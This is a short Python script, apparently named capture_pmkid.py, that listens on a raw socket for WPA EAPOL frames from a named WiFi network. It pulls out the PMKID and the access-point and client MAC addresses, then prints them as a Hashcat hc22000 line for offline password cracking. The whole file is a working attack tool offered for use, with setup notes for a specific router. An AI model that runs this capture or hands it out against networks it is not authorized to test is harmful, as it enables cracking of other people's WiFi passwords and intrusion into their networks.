import socket, sys

interface = None
essid = None
frame_num = 0

# User Supplied Values:
# WiFi Interface, SSID
if len(sys.argv) > 1:
    interface=sys.argv[1]
if len(sys.argv) > 2:
    essid=sys.argv[2]

if not (interface and essid):
    raise Exception("Interface and SSID not entered correctly! \n" +\
          "Format should be: 'sudo python3 capture_pmkid.py <INTERFACE> <SSID>'")

# Use WiFi interface to capture packets
rawSocket = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
rawSocket.bind((interface, 0x0003))

print('Connect to "' + essid + '" using ' + interface +\
      ' and a random password to capture PMKID...')

first_eapol_frame = None
pmkid = None
mac_ap = None
mac_cl = None

# Listen for packets from target network
while True:
    packet = rawSocket.recvfrom(2048)[0]
    frame_body = packet

    # Offset may vary depending on equipment and AP. 2 worked when
    # testing with a TP-Link Archer C1200 v2.0 Router
    # Firmware Version 2.0.0, but your setup may require an offset
    # of 0, 4, 6 or something else.
    offset = 2
    eapol_frame = frame_body[offset:]
    frame_num += 1

    if frame_num == 1:
        first_eapol_frame = eapol_frame
        pmkid = eapol_frame[-16:].hex()
        mac_ap = eapol_frame[4:10].hex()

    if frame_num == 2:
        mac_cl = eapol_frame[4:10].hex()
        print("\n1st EAPoL Frame:   \n"+ str(first_eapol_frame)+"\n")
        print("Possible PMKID:        ", pmkid)
        print("SSID:                  ", essid)
        print("MAC AP:                ", mac_ap)
        print("MAC Client:            ", mac_cl)
        print("\nHashcat hc22000 format hash line:")
        print("WPA*01*"+pmkid+"*"+mac_ap+"*"+mac_cl+\
              "*"+bytes(essid,'utf-8').hex()+"***")
        sys.exit()